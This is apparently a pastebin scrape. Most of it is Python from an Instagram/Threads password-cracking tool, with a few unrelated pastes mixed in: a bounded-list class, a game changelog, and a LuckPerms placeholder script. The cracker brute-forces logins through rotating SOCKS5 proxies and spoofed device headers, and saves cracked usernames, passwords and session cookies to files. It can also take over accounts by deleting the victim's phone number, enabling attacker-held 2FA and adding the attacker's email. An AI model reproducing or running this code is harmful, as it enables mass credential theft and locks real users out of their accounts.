                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        "
0CpwMNs1,Pythoon Bounded Lists,Nicciniamh,Python,Thursday 7th of March 2024 04:31:18 PM CDT,"import collections
import numpy as np

class BoundList(collections.UserList):
	'''
	BoundList is a list which is kept to a maximum lenght of bound
	any operation that lengthens the list is checked for the length, 
	if too long, the length is shortened by removing the leftmost item
	'''
	def __init__(self,bound):
		self.data = []
		self.bound = bound
		super().__init__()

	def append(self,item):
		super().append(item)
		self._checkbounds()

	def __setitem__(self, idx, item):
		self.data[idx] = item
		self._checkbounds()

	def _checkbounds(self):
		if len(self.data) > self.bound:
			del self.data[0]

class AveragedBoundList(BoundList):
	'''
	this class implements a BoundList where properties are defined for 
	min, max, average and std. None of these are computed until the property 
	is accessed. Unlike BoundList, AveragedBoundLists must only be numbers. 
	'''
	def __init__(self,bound):
		super().__init__(bound)
		self.numeric = True

	def append(self,item):
		if self.numeric:
			''' 
			check to see if a numeric item is passed if not 
			the list is no longer numeric. Once the list 
			is not numeric it is the same as a BoundList
			calling min,max,average,and std will raise a ValueError
			also using those properties with no data will result in the same.
			'''
			if type(item) is int or type(item) is float:
				self.numeric = True
			else:
				self.numeric = False
		super().append(item)
	
	def push(self,item,rta=False):
		'''
		append an item to data. if rta is true return self.average
		'''
		self.append(item)
		if rta and self.numeric: 
			return self.average
		else:
			return item

	@property
	def min(self):
		'''
		minimum value stored
		'''
		if not len(self.data):
			raise ValueError('list is empty')

		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.min(self.data)
	
	@property
	def max(self):
		'''
		maximum value stored
		'''
		if not len(self.data):
			raise ValueError('list is empty')
		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.max(self.data)
	
	@property
	def average(self):
		'''
		average of list
		'''
		if not len(self.data):
			raise ValueError('list is empty')
		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.average(self.data)

	@property
	def std(self):
		'''
		standard deviation of list
		'''
		if not len(self.data):
			raise ValueError('list is empty')
		if not self.numeric:
			raise ValueError('list is not numeric')
		return np.std(self.data)


if __name__ == ""__main__"":
	bl = BoundList(10)
	for i in range(0,25):
		bl.append(i)

	for n in bl:
		print(f'{n}')


	print(f'bl {bl.__dict__}')

	abl = AveragedBoundList(10)
	for i in range(0,10):
		x = np.random.random()*100
		r = abl.push(x,True)
		print(f'{i}:',x,r)

	print(f'abl {abl.__dict__} min: {abl.min}, max: {abl.max}, avg: {abl.average}, std: {abl.std}')
"
SAtU9HmY,Untitled,detodounpoquito,JSON,Thursday 7th of March 2024 04:22:56 PM CDT,"- Se modifico el tiempo de Cooldown del Teléfono Rojo de 60 segundos a 10 minutos (600 segundos)
- Estamos buscando a alguien que nos ayude a desarrollar un Menú donde se pueda elegir personajes; gratis, pagos o desbloqueables.
- Si estas interesado únete al discord.gg/Tpck3zvS6x"
9SYZcbVX,"Скрипт для вывода количества приватов, в зависимости от доната / PlaceholderAPI",JaycobYT,JavaScript,Thursday 7th of March 2024 03:59:37 PM CDT,"//  
//  Перед использованием убедитесь, что у вас
//  установлены расширения для PlaceholderAPI,
//  такие как LuckPerms и Javascript Expansion
//  
//  Детальная инфа по созданию и подключению
//  скриптов в туториале → https://youtu.be/PezAmNkN7o0
//  
//  
function placeholderCheck() {
	switch (""%luckperms_highest_group_by_weight%"")
	{
	  case 'default':
		return ""3"";

	  case 'knight':
		return ""5"";

	  case 'lord':
		return ""7"";

	  case 'prince':
		return ""10"";
	}
}

placeholderCheck();"
X5jQnpBB,203.78.117.57-/sdcard/instagram.py.py,OBF-XIn,Python,Thursday 7th of March 2024 03:56:56 PM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from asset.enc_password import Requre
from asset.amankan_data import Require
from asset.useragent import Useragent
from facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
